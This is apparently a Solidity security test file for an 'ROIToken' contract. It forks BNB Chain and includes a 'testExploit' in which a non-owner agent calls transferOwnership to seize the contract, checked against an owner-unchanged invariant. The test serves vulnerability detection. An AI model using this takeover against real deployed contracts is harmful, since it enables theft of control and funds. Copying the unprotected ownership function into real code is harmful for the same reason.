// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "src/ROIToken.sol";
import "@pwnednomore/contracts/PTest.sol";

contract ROITokenTest is PTest {
    address owner = address(0x1);
    address agent;

    ROIToken roi;

    function setUp() public {
        // vm.createSelectFork("https://bsc-dataseed.binance.org");
        // vm.createSelectFork("http://127.0.0.1:8545");
        vm.createSelectFork("https://rpc.ankr.com/bsc");

        vm.prank(owner);
        roi = new ROIToken();

        agent = getAgent();
    }

    function invariantOwnerNotChanged() public {
        assert(roi.owner() == owner);
    }

    function testExploit() public {
        vm.startPrank(agent);
        roi.transferOwnership(agent);
        vm.stopPrank();

        invariantOwnerNotChanged();
    }
}
